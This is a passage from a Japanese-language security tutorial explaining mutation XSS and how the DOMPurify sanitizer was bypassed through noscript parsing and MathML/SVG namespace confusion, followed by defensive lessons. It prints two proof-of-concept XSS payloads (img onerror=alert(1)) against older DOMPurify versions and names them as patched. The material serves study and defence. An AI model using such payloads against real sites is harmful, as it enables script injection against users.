
---

### 発展: フィルタの次の戦場——mutation XSS（mXSS）とサニタイザ回避

ブラウザ組み込みフィルタが消えた今、防御の主役は **サニタイザライブラリ**（DOMPurify などの、危険な HTML を除去して安全な HTML を返すライブラリ）に移りました。そして攻撃側の主戦場も、フィルタ回避から**サニタイザ回避**へ移りました。その最先端が **mutation XSS（mXSS＝変異型 XSS）** で、これは Kinugawa 氏が世界的に有名になった研究領域です。PayloadsAllTheThings も mXSS の項で Kinugawa 氏の Google 検索に対する事例を収録しています。

#### mXSS とは——「サニタイズ後に安全でなくなる」現象

mXSS の原理は、**「サニタイザが検査・整形した HTML 文字列が、ブラウザの DOM に挿入されて再パースされる過程で、勝手に別の（危険な）DOM に『変異』する」** ことにあります。多くのサニタイザは「HTML をパース → 危険な要素・属性を除去 → 安全な HTML 文字列に再シリアライズ（DOM を文字列に書き戻す）」という流れで動きます。ところが、この**再シリアライズした文字列を最終的に `innerHTML` などに入れると、ブラウザが再びパースし直す**。このとき「サニタイザがパースした結果」と「ブラウザが再パースした結果」がズレると、除去したはずの実行可能コードが復活してしまう。これが mXSS です。要点は **「サニタイザのパーサと、最終挿入先のブラウザパーサの、解釈の差」** を突く点にあり、charset 回避で見た「二つの解釈環境のズレ」とまったく同じ発想です。

PayloadsAllTheThings が挙げる、Kinugawa 氏による Google 検索への mXSS（DOMPurify に対して機能した）:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

なぜ変異するか: `<noscript>` 要素の中身は、「JavaScript が有効なブラウザ」と「無効なブラウザ」でパース規則が変わる特殊な要素です。JS 有効時、`<noscript>` の中身は生テキスト的に扱われ、`<p title="</noscript>...` の `</noscript>` は「属性値の一部の文字列」と見なされます。ところがサニタイズを経て再度 DOM に挿入されると、パースの文脈が変わって `</noscript>` が本物の閉じタグとして解釈され、その後ろの `<img src=x onerror=alert(1)>` が**属性値の中から解放されて生きた要素になる**。つまり「サニタイザには無害な属性値に見え、ブラウザ再パースで実行要素に変異する」——これが mXSS の典型です。

> 出典: PayloadsAllTheThings — XSS Injection README（Mutation XSS の項） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

#### namespace confusion による DOMPurify < 2.0.17 バイパス

（以下は、担当資料からリンクされる詳細記事〔securitum の解説等〕が執筆環境のネットワーク制限で直接取得できなかったため、Web 検索結果のスニペットと一般的な知識に基づく補足解説です。バージョン等の細部は必ず一次情報で確認してください。）

mXSS の中でも特に重要なのが **namespace confusion（名前空間の混乱）** を使った DOMPurify のバイパスです。これは Michał Bentkowski 氏が公開した **「DOMPurify < 2.0.17 バイパス」**（2020年、修正版は DOMPurify 2.0.17）として知られ、Kinugawa 氏の一連の mXSS 研究とも密接に関連します。

背景となる仕組み: HTML には **三つの名前空間（namespace）** が混在します——通常の HTML、SVG、MathML です。`<svg>` や `<math>` の内側は「foreign content（外来コンテンツ）」と呼ばれ、**通常の HTML とはパース規則が変わります**。さらにその中に `<foreignObject>`（SVG 内）や `<mtext>` / `<mi>`（MathML 内。これらは「integration point＝統合点」と呼ばれ、内部で HTML 名前空間へ戻る）などがあると、**パーサはその境界で名前空間を切り替える**。この「どこで名前空間が切り替わるか」の判断が、サニタイザのパースとブラウザの再パースでズレると、除去されたはずのタグが復活します。

代表的なペイロードの形（`<mglyph>` や `<mtext>` と `<style>` を組み合わせるもの）:

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

なぜ変異するか（概略）: `<mglyph>` や `<malignmark>` は MathML の中で特殊な扱いを受ける要素で、`<mtext>`（MathML のテキスト統合点）の中に置かれると名前空間の解釈が切り替わります。サニタイザは、ある名前空間の文脈で `<style>` の中身を「ただのスタイル文字列（無害なテキスト）」として扱い、その中の `<img onerror>` を実行可能な要素とは認識せず素通しします。ところがサニタイズ済み文字列を DOM に挿入して再パースすると、名前空間の切り替わり方が変わり、`<style>` がもはやその中身を生テキストとして保持しなくなって、内部の `<img src onerror=alert(1)>` が**本物の要素として起き上がり発火する**。「サニタイザが想定した名前空間」と「ブラウザ再パース時の名前空間」の食い違いが、除去したはずのコードを蘇らせる——これが namespace confusion による mXSS の核心です。

> 出典（検索スニペットによる二次確認）: Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass（Michał Bentkowski, securitum）／PortSwigger Research "Bypassing DOMPurify again with mutation XSS" — 検索: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss

#### バージョン依存の攻撃という視点（陳腐化への注意）

ここで強調したいのは、**サニタイザ回避は「バージョン依存の攻撃」だ**という点です。上記の namespace confusion バイパスは **DOMPurify < 2.0.17（2020年に 2.0.17 で修正）** に対するものであり、最新版では通用しません。しかし DOMPurify はその後も新たな mXSS（例えば Kinugawa 氏や他の研究者が発見した、より深いネストを使う変異や、`<template>`・`<xmp>`・エンティティ処理を突くもの）で複数回バイパスされ、そのたびに修正を重ねてきました。

学習者への実践的教訓は三つです。

1. **サニタイザは「使えば安全」ではなく「最新に保てば相対的に安全」**。防御側は DOMPurify 等を必ず最新版に追従させる。攻撃・診断側は対象が使っているライブラリと**そのバージョン**を特定し、そのバージョンで既知のバイパスがないかを調べる。
2. **バイパス手法には必ず「対象バージョン」と「修正年・修正版」がある**。本節の各ペイロード（Chrome 59〜65 で順次修正された XSS Auditor 回避群、2020年の DOMPurify 2.0.17 バイパス等）は、その大半が**すでに修正済み**です。丸暗記して現行環境に投げても動きません。価値があるのは**「なぜ動いたか」の原理**で、それは新しいバイパスを自分で発見する土台になります。
3. **mXSS の根本原因は「サニタイズと最終挿入で HTML が二度パースされ、その解釈が食い違う」こと**。よって最も堅牢な防御は、そもそも文字列 HTML を組み立てて挿入しない設計——`textContent` を使う、`Trusted Types`（信頼できる型以外を sink に入れさせないブラウザ機構）を導入する、サニタイズ結果を `innerHTML` ではなく安全な API 経由で挿入する——です（詳細は防御の章に譲ります）。

---

### この節のまとめ

- **PayloadsAllTheThings** は「文脈で引く辞書」。入力が落ちる文脈（タグ内／属性値内／JS 文字列内／URL）をまず特定し、その欄のペイロードを選ぶ。`<script>` が無理なら `onerror`/`onload`、それも無理ならエンコーディング回避、文脈不明ならポリグロット、という手順を体で覚える。ペイロードには常に「なぜ動くか」（パーサの状態、文字参照の復元、スキーム判定の緩さ）が対応する。
- **Kinugawa filterbypass** は「フィルタ回避の原理集」。対象の XSS Auditor / IE・Edge XSS Filter は既に廃止済みだが、そこで確立された **charset 混乱・パーサ状態遷移・同一オリジンリソース悪用・名前空間の混乱** という発想は、現代の WAF 回避・サニタイザ回避・mXSS にそのまま生きる。
- 両資料に共通する統一原理は **「フィルタ／サニタイザが見る文字列と、ブラウザが最終的に解釈する文字列を、意図的にズラす」** こと。文字コード、パース文脈、名前空間——どのレイヤーでズレを作っても XSS は成立し得る。
- したがって防御は「危険な文字列を弾く（ブロックリスト）」では原理的に穴が残る。**出力時の文脈別エンコーディング、charset の明示（+ `nosniff`）、サニタイザの最新化、`Trusted Types`／CSP による許可リスト型の多層防御**——これらの組み合わせだけが持続的に有効である。
